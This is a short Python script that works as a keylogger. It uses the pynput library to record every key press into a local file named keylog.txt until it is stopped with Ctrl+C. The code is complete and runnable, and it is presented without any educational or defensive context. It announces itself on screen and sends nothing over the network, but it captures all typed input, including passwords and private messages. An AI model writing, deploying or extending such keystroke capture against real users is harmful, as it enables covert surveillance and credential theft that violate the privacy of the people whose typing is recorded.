from pynput.keyboard import Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key) + "\n")
    except Exception as e:
        print("Error:", e)

def main():
    print("Keylogger started. Press Ctrl + C to stop.")

    with Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("Keylogger stopped.")
            pass

if __name__ == "__main__":
    main()
